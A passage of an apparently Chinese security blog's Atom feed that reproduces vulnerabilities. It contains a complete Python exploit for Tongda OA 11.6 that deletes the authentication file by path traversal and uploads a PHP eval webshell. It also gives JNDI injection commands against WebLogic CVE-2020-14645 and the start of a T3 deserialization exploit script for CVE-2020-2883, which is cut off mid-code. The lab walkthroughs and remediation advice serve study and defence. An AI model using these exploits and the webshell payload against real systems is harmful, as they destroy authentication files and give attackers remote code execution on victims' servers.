class="headerlink" title="2.3 缺陷状态"></a>2.3 缺陷状态</h4><p>（1）激活状态(Active或Open)。</p><p>（2）已修正状态(Fixed或Resolved)。</p><p>（3）关闭或非激活状态(Close或Inactive)。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;软件测试项目实操指南与过程文档&quot;&gt;&lt;a href=&quot;#软件测试项目实操指南与过程文档&quot; class=&quot;headerlink&quot; title=&quot;软件测试项目实操指南与过程文档&quot;&gt;&lt;/a&gt;软件测试项目实操指南与过程文档&lt;/h1&gt;&lt;p&gt;软件测试分为如下几个阶段&lt;/p&gt;
&lt;h2 id=&quot;一、测试需求分析阶段&quot;&gt;&lt;a href=&quot;#一、测试需求分析阶段&quot; class=&quot;headerlink&quot; title=&quot;一、测试需求分析阶段&quot;&gt;&lt;/a&gt;一、测试需求分析阶段&lt;/h2&gt;&lt;p&gt;测试需求分析阶段主要工作是获得测试项目的测试需求(测试规格)。&lt;br&gt;输出产物:《可测试性需求说明书》和《测试规格》&lt;/p&gt;
    
    </summary>
    
    
      <category term="软件测评" scheme="http://yoursite.com/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%84/"/>
    
    
      <category term="软件测评" scheme="http://yoursite.com/tags/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%84/"/>
    
      <category term="模板" scheme="http://yoursite.com/tags/%E6%A8%A1%E6%9D%BF/"/>
    
      <category term="过程文档" scheme="http://yoursite.com/tags/%E8%BF%87%E7%A8%8B%E6%96%87%E6%A1%A3/"/>
    
  </entry>
  
  <entry>
    <title>通达OA11.6任意文件删除+文件上传组合GetShell</title>
    <link href="http://yoursite.com/2020/08/23/Tongda-OA11-6-Getshell/"/>
    <id>http://yoursite.com/2020/08/23/Tongda-OA11-6-Getshell/</id>
    <published>2020-08-23T08:39:13.707Z</published>
    <updated>2020-08-23T08:59:58.205Z</updated>
    
    <content type="html"><![CDATA[<h1 id="通达OA11-6任意文件删除-文件上传组合GetShell"><a href="#通达OA11-6任意文件删除-文件上传组合GetShell" class="headerlink" title="通达OA11.6任意文件删除+文件上传组合GetShell"></a>通达OA11.6任意文件删除+文件上传组合GetShell</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。</p><p>通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。</p><a id="more"></a><p>漏洞利用思路：利用任意文件删除漏洞删除认证文件然后通过文件上传写入一句话木马getshell</p><p>注意⚠️：此漏洞会删除认证的文件，然后上传shell，所以该漏洞是会破坏系统认证文件,如果成功利用后会删除程序中的php文件可能会导致程序功能无法使用。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>版本：通达OA 11.6</p><p>链接：<code>https://pan.baidu.com/s/1VqUUNUsgsssK1Mhq2r8HHQ</code></p><p>提取码：him4</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>靶机环境：win7系统，下载安装包全部默认配置无脑下一步安装</p><p><img src="/2020/08/23/Tongda-OA11-6-Getshell/1.png" alt></p><p>成功访问网站登录页面如下</p><p><img src="/2020/08/23/Tongda-OA11-6-Getshell/2.png" alt></p><p>至此确认漏洞环境搭建成功</p><p>大佬给出的poc如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">target=<span class="string">"http://oa.test.com/"</span></span><br><span class="line">payload=<span class="string">"&lt;?php eval($_REQUEST['a']);?&gt;"</span></span><br><span class="line">print(<span class="string">"[*]Warning,This exploit code will DELETE auth.inc.php which may damage the OA"</span>)</span><br><span class="line">input(<span class="string">"Press enter to continue"</span>)</span><br><span class="line">print(<span class="string">"[*]Deleting auth.inc.php...."</span>)</span><br><span class="line"></span><br><span class="line">url=target+<span class="string">"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"</span></span><br><span class="line">requests.get(url=url)</span><br><span class="line">print(<span class="string">"[*]Checking if file deleted..."</span>)</span><br><span class="line">url=target+<span class="string">"/inc/auth.inc.php"</span></span><br><span class="line">page=requests.get(url=url).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">'No input file specified.'</span> <span class="keyword">not</span> <span class="keyword">in</span> page:</span><br><span class="line">    print(<span class="string">"[-]Failed to deleted auth.inc.php"</span>)</span><br><span class="line">    exit(<span class="number">-1</span>)</span><br><span class="line">print(<span class="string">"[+]Successfully deleted auth.inc.php!"</span>)</span><br><span class="line">print(<span class="string">"[*]Uploading payload..."</span>)</span><br><span class="line">url=target+<span class="string">"/general/data_center/utils/upload.php?action=upload&amp;filetype=nmsl&amp;repkid=/.&lt;&gt;./.&lt;&gt;./.&lt;&gt;./"</span></span><br><span class="line">files = &#123;<span class="string">'FILE1'</span>: (<span class="string">'hack.php'</span>, payload)&#125;</span><br><span class="line">requests.post(url=url,files=files)</span><br><span class="line">url=target+<span class="string">"/_hack.php"</span></span><br><span class="line">page=requests.get(url=url).text</span><br><span class="line"><span class="keyword">if</span> <span class="string">'No input file specified.'</span> <span class="keyword">not</span> <span class="keyword">in</span> page:</span><br><span class="line">    print(<span class="string">"[+]Filed Uploaded Successfully"</span>)</span><br><span class="line">    print(<span class="string">"[+]URL:"</span>,url)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">print(<span class="string">"[-]Failed to upload file"</span>)</span><br></pre></td></tr></table></figure><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我们通过分析POC我们可知，首先通过任意文件删除漏洞删除<code>/webroot/inc/</code>目录中的<code>auth.inc.php</code>文件，这里利用的是目录<code>\webroot\module\appbuilder\assets</code>下<code>print.php</code>文件中的一处任意文件删除漏洞，查看代码文件，全是乱码，应该是经过加密处理，使用使用在线解密工具解密</p><p><code>http://dezend.qiling.org/free.html</code></p><p>解密后文件如下：</p><p><img src="/2020/08/23/Tongda-OA11-6-Getshell/3.png" alt></p><p>可以看到，首先对<code>$s_tmp</code>进行赋值一个要删除的文件，最后通过<code>unlink</code>函数将文件删除，POC通过此漏洞删除了<code>/webroot/inc/</code>目录中的<code>auth.inc.php</code>文件，根据名字我们可以粗略判断这是一段用于权限校验的代码，我们同样使用解密工具解密<code>auth.inc.php</code>文件</p><p><img src="/2020/08/23/Tongda-OA11-6-Getshell/4.png" alt></p><p>这个文件用于判断用户是否登录，如果未登录的话，就无法上传文件，所以需要将此文件删除，才能成功上传成功。</p><p>所以POC的漏洞利用思路如下：</p><p>首先对<code>$s_tmp</code>进行赋值，这里的<code>guid</code>为我们POC中的<code>../../../webroot/inc/auth.inc.php</code>文件，最后通过<code>unlink</code>函数将登录校验文件<code>auth.inc.php</code>删除，然后我们达到成功上传webshell的目的。</p><h3 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h3><p>攻击会删除<code>auth_inc.php</code>文件，这里先做个备份。（注意千万不要找公网环境测试，本地自己搭建环境测试）</p><p>修改POC中的target为我们的靶机环境，执行脚本</p><p><img src="/2020/08/23/Tongda-OA11-6-Getshell/5.png" alt></p><p>成功上传webshell文件，使用蚁剑连接</p><p><img src="/2020/08/23/Tongda-OA11-6-Getshell/6.png" alt></p><p>成功getshell</p><p><img src="/2020/08/23/Tongda-OA11-6-Getshell/7.png" alt></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>以上漏洞已在官方的最新版本中修复，建议受影响的用户升级至最新版本进行防护，</p><p>官方下载链接：</p><p><a href="https://www.tongda2000.com/download/p2019.php" target="_blank" rel="noopener">https://www.tongda2000.com/download/p2019.php</a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://mp.weixin.qq.com/s?src=11&timestamp=1597979065&ver=2535&signature=Scl7syktdMYi2FNWo8JUaFzBtLtPAXQOpqrEYohcliaITc-c-vjoz75UBzHUPe9b5-JouKJIFEw9PIW9N**t*PelOu3CRMChwfYWnaIsKKIW4bSc-Kj4RXBz1LFzkHE-&new=1" target="_blank" rel="noopener">通达OA11.6漏洞复现</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;通达OA11-6任意文件删除-文件上传组合GetShell&quot;&gt;&lt;a href=&quot;#通达OA11-6任意文件删除-文件上传组合GetShell&quot; class=&quot;headerlink&quot; title=&quot;通达OA11.6任意文件删除+文件上传组合GetShell&quot;&gt;&lt;/a&gt;通达OA11.6任意文件删除+文件上传组合GetShell&lt;/h1&gt;&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;通达OA（Office Anywhere网络智能办公系统）是由北京通达信科科技有限公司自主研发的协同办公自动化软件，是与中国企业管理实践相结合形成的综合管理办公平台。&lt;/p&gt;
&lt;p&gt;通达OA为各行业不同规模的众多用户提供信息化管理能力，包括流程审批、行政办公、日常事务、数据统计分析、即时通讯、移动办公等，帮助广大用户降低沟通和管理成本，提升生产和决策效率。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="通达OA11.6" scheme="http://yoursite.com/tags/%E9%80%9A%E8%BE%BEOA11-6/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-14645  Weblogic远程代码执行漏洞复现</title>
    <link href="http://yoursite.com/2020/08/23/weblogic-CVE-2020-14645/"/>
    <id>http://yoursite.com/2020/08/23/weblogic-CVE-2020-14645/</id>
    <published>2020-08-23T08:38:32.700Z</published>
    <updated>2020-08-23T08:59:02.774Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2020-14645-Weblogic远程代码执行漏洞复现"><a href="#CVE-2020-14645-Weblogic远程代码执行漏洞复现" class="headerlink" title="CVE-2020-14645  Weblogic远程代码执行漏洞复现"></a>CVE-2020-14645  Weblogic远程代码执行漏洞复现</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>今日，Oracle官方发布WebLogic安全更新，其中修复了一个CVSS评分为9.8的严重漏洞(CVE-2020-14645)，该漏洞通过T3协议进行利用，攻击者可以实现远程代码执行，进而控制服务器。由于漏洞利用复杂度低，风险高，建议尽快修复。</p><p>WebLogic是美国Oracle公司出品的一个application server，是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。Oracle WebLogic Server存在远程代码执行漏洞。</p><p>攻击者可利用该漏洞实现远程代码执行。该反序列化的gadget存在与coherence包中。编号CVE-2020-14645。</p><p>构造chain类似于common-collection的chain，可以照葫芦画瓢。</p><p>mvn 好像不能下载coherence包，很奇怪，直接下jar包就行。</p><p>反序列化的对象，通过t3发送给weblogic即可。所以，这个只是生成payload的工具。</p><a id="more"></a><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul><li>Oracle Oracle WebLogic Server 10.3.6.0.0</li><li>Oracle WebLogic Server 12.2.1.4.0</li><li>Oracle WebLogic Server 12.2.1.3.0</li><li>Oracle WebLogic Server 12.1.3.0.0</li><li>Oracle WebLogic Server 14.1.1.0.0</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>WebLogic 12.2.1.4官方下载链接:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://download.oracle.com/otn/nt/middleware/12c/122140/fmw_12.2.1.4.0_wls_lite_Disk1_1of1.zip</span></span><br></pre></td></tr></table></figure><p>下载JDK 6u211/7u201/8u191任意版本并配置环境变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">JDK8u191</span><br><span class="line">下载地址：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1cCtSolwsZCmL7xN6orTjTw</span><br><span class="line">提取码：nmi1</span><br></pre></td></tr></table></figure><p>用管理员权限打开CMD命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar fmw_12.2.1.4.0_wls_lite_generic.jar</span><br></pre></td></tr></table></figure><p>全部点击下一步，勾选自主启动配置向导选项</p><p><img src="/2020/08/23/weblogic-CVE-2020-14645/1.png" alt></p><p>创建新域并勾选所有模板，点击下一步至安装完成</p><p><img src="/2020/08/23/weblogic-CVE-2020-14645/2.png" alt></p><p>安装成功后，跳到base_domain目录下</p><p>C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain</p><p>运行startWebLogic.cmd</p><p><img src="/2020/08/23/weblogic-CVE-2020-14645/3.png" alt></p><p>可访问7001端口（<a href="http://192.168.1.111:7001/console/login/LoginForm.jsp），说明环境部署成功" target="_blank" rel="noopener">http://192.168.1.111:7001/console/login/LoginForm.jsp），说明环境部署成功</a></p><p><img src="/2020/08/23/weblogic-CVE-2020-14645/4.png" alt></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>JNDI工具下载地址</p><p><a href="https://github.com/welk1n/JNDI-Injection-Exploit" target="_blank" rel="noopener">https://github.com/welk1n/JNDI-Injection-Exploit</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C [command] -A [address]</span><br></pre></td></tr></table></figure><p>使用JNDI工具搭建LDAP和HTTP服务，注意不能占用8180/1099/1389三个端口，修改要执行的命令后回车，会同时启动LDAP/RMI/HTTP三种服务，并且自动编译好带命令的class文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C calc -A 192.168.1.236</span><br></pre></td></tr></table></figure><p><img src="/2020/08/23/weblogic-CVE-2020-14645/5.png" alt></p><p>使用CVE-2020-14645漏洞验证工具</p><p><a href="https://github.com/DSO-Lab/Weblogic_CVE-2020-14645" target="_blank" rel="noopener">https://github.com/DSO-Lab/Weblogic_CVE-2020-14645</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar CVE-2020-14645.jar LDAP_IP:LDAP_PORT&#x2F;#Exploit http:&#x2F;&#x2F;192.168.1.111:7001</span><br></pre></td></tr></table></figure><p>输入JNDI工具搭建LDAP地址和端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar CVE-2020-14645.jar 192.168.1.236:1389&#x2F;mcq0vt http:&#x2F;&#x2F;192.168.1.111:7001</span><br></pre></td></tr></table></figure><p><img src="/2020/08/23/weblogic-CVE-2020-14645/6.png" alt></p><p>输入命令请求LDAP服务，执行自动编译的class文件，成功弹出计算器（失败，无法弹出计算器）</p><p><img src="/2020/08/23/weblogic-CVE-2020-14645/7.png" alt></p><p>PS：java版本&lt;jdk 6u211/7u201/8u191，我用的是8u191，最后没有复现成功，通过本地测试发现报错如下：</p><p><img src="/2020/08/23/weblogic-CVE-2020-14645/8.png" alt></p><p>​    原因是在更高版本的JDK环境中trustURLCodebase变量为false，限制了远程类的加载。</p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><h3 id="1、官方修复方案"><a href="#1、官方修复方案" class="headerlink" title="1、官方修复方案"></a>1、官方修复方案</h3><p>Oracle已经发布补丁修复了上述漏洞，请用户参考官方通告及时下载受影响产品更新补丁，并参照补丁安装包中的readme文件进行安装更新，以保证长期有效的防护。</p><p>   注：Oracle官方补丁需要用户持有正版软件的许可账号，使用该账号登陆<a href="https://support.oracle.com/" target="_blank" rel="noopener"><strong>https://support.oracle.com</strong></a>后，可以下载最新补丁。</p><h3 id="2、临时解决方案"><a href="#2、临时解决方案" class="headerlink" title="2、临时解决方案"></a>2、临时解决方案</h3><p>用户可通过控制T3协议的访问来临时阻断针对这些漏洞的攻击。操作方法如下：</p><pre><code>1. 进入WebLogic控制台，在base_domain的配置页面中，进入“安全”选项卡页面，点击“筛选器”，进入连接筛选器配置。2. 在连接筛选器中输入：weblogic.security.net.ConnectionFilterImpl，参考以下写法，在连接筛选器规则中配置符合企业实际情况的规则：</code></pre>   <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 * * allow t3 t3s</span><br><span class="line">本机IP * * allow t3 t3s</span><br><span class="line">允许访问的IP  * * allow t3 t3s  </span><br><span class="line">* * * deny t3 t3s</span><br></pre></td></tr></table></figure><pre><code>3. 保存后若规则未生效，建议重新启动WebLogic服务（重启WebLogic服务会导致业务中断，建议相关人员评估风险后，再进行操作）。</code></pre><h3 id="3、禁用IIOP协议。"><a href="#3、禁用IIOP协议。" class="headerlink" title="3、禁用IIOP协议。"></a>3、禁用IIOP协议。</h3><p>可通过关闭 IIOP 协议对此漏洞进行缓解。操作如下： </p><ol><li><p>在 Weblogic 控制台中，选择“服务”-&gt;”AdminServer”-&gt;”协议”，取消“启用 IIOP”的勾选。</p></li><li><p>并重启 Weblogic 项目，使配置生效。</p></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;CVE-2020-14645-Weblogic远程代码执行漏洞复现&quot;&gt;&lt;a href=&quot;#CVE-2020-14645-Weblogic远程代码执行漏洞复现&quot; class=&quot;headerlink&quot; title=&quot;CVE-2020-14645  Weblogic远程代码执行漏洞复现&quot;&gt;&lt;/a&gt;CVE-2020-14645  Weblogic远程代码执行漏洞复现&lt;/h1&gt;&lt;h2 id=&quot;漏洞介绍&quot;&gt;&lt;a href=&quot;#漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;漏洞介绍&quot;&gt;&lt;/a&gt;漏洞介绍&lt;/h2&gt;&lt;p&gt;今日，Oracle官方发布WebLogic安全更新，其中修复了一个CVSS评分为9.8的严重漏洞(CVE-2020-14645)，该漏洞通过T3协议进行利用，攻击者可以实现远程代码执行，进而控制服务器。由于漏洞利用复杂度低，风险高，建议尽快修复。&lt;/p&gt;
&lt;p&gt;WebLogic是美国Oracle公司出品的一个application server，是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。Oracle WebLogic Server存在远程代码执行漏洞。&lt;/p&gt;
&lt;p&gt;攻击者可利用该漏洞实现远程代码执行。该反序列化的gadget存在与coherence包中。编号CVE-2020-14645。&lt;/p&gt;
&lt;p&gt;构造chain类似于common-collection的chain，可以照葫芦画瓢。&lt;/p&gt;
&lt;p&gt;mvn 好像不能下载coherence包，很奇怪，直接下jar包就行。&lt;/p&gt;
&lt;p&gt;反序列化的对象，通过t3发送给weblogic即可。所以，这个只是生成payload的工具。&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞复现" scheme="http://yoursite.com/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="漏洞" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="漏洞复现" scheme="http://yoursite.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
      <category term="weblogic" scheme="http://yoursite.com/tags/weblogic/"/>
    
      <category term="CVE-2020-14645" scheme="http://yoursite.com/tags/CVE-2020-14645/"/>
    
      <category term="JNDI" scheme="http://yoursite.com/tags/JNDI/"/>
    
  </entry>
  
  <entry>
    <title>Vulfocus 复现weblogic_CVE-2020-2883漏洞</title>
    <link href="http://yoursite.com/2020/08/23/weblogic-CVE-2020-2883/"/>
    <id>http://yoursite.com/2020/08/23/weblogic-CVE-2020-2883/</id>
    <published>2020-08-23T08:38:14.062Z</published>
    <updated>2020-08-23T08:58:06.604Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vulfocus-复现weblogic-CVE-2020-2883漏洞"><a href="#Vulfocus-复现weblogic-CVE-2020-2883漏洞" class="headerlink" title="Vulfocus 复现weblogic_CVE-2020-2883漏洞"></a>Vulfocus 复现weblogic_CVE-2020-2883漏洞</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>在Oracle官方发布的2020年4月关键补丁更新公告CPU（Critical Patch Update）中，两个针对 WebLogic Server ，CVSS 3.0评分为 9.8的严重漏洞（CVE-2020-2883、CVE-2020-2884），允许未经身份验证的攻击者通过T3协议网络访问并破坏易受攻击的WebLogic Server，成功的漏洞利用可导致WebLogic Server被攻击者接管，从而造成远程代码执行。</p><a id="more"></a><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><ul><li>Oracle WebLogic Server 10.3.6.0.0</li><li>Oracle WebLogic Server 12.1.3.0.0</li><li>Oracle WebLogic Server 12.2.1.3.0</li><li>Oracle WebLogic Server 12.2.1.4.0</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>我们使用vulfocus靶场一键启动搭建本漏洞环境，Vulfocus 是一个漏洞集成平台，将漏洞环境 docker 镜像，放入即可使用，开箱即用，可以过。</p><p>在线演示：<a href="http://vulfocus.fofa.so/，本环境是在一台服务器上安装ubuntu虚拟机，在虚拟机中安装vulfocus" target="_blank" rel="noopener">http://vulfocus.fofa.so/，本环境是在一台服务器上安装ubuntu虚拟机，在虚拟机中安装vulfocus</a> docker靶场，然后通过局域网其他机器模拟攻击，拓扑图如下：</p><p><img src="/2020/08/23/weblogic-CVE-2020-2883/1.png" alt></p><p>安装vulfocus之后打开网站启动ulfocus docker靶场(图片上的显示的192.168.109.136 IP地址是系统bug，实际地址是192.168.109.140)</p><p><img src="/2020/08/23/weblogic-CVE-2020-2883/2.png" alt></p><p>我们可以在服务器192.168.1.111上访问192.168.109.140:50281确认weblogic靶机成功</p><p><img src="/2020/08/23/weblogic-CVE-2020-2883/3.png" alt></p><p>然后我们通过拓扑图，虚拟机是net方式部署，可知攻击机是无法访问weblogic服务的，我们可以通过在虚拟网卡上添加一条端口映射</p><p><img src="/2020/08/23/weblogic-CVE-2020-2883/4.png" alt></p><p>然后我们就可以在攻击机192.168.1.236成功访问weblogic服务了</p><p><img src="/2020/08/23/weblogic-CVE-2020-2883/5.png" alt></p><p>至此，一个完整的weblogic靶机环境搭建成功。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先，漏洞POC如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">globalProxies = &#123;&#125;</span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parseUrl</span><span class="params">(url)</span>:</span></span><br><span class="line">    parsed = urlparse.urlparse(url)</span><br><span class="line">    proto = parsed.scheme</span><br><span class="line">    netloc = parsed.netloc</span><br><span class="line">    ip = netloc</span><br><span class="line">    <span class="keyword">if</span> proto == <span class="string">'http'</span>:</span><br><span class="line">        port = <span class="number">80</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        port = <span class="number">443</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="string">':'</span> <span class="keyword">in</span> netloc):</span><br><span class="line">        ip = netloc.split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line">        port = netloc.split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    uri = parsed.path</span><br><span class="line">    <span class="keyword">return</span> (proto, ip, port, uri)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CVE_2020_2883</span><span class="params">(cmd)</span>:</span></span><br><span class="line">    payload_start = <span 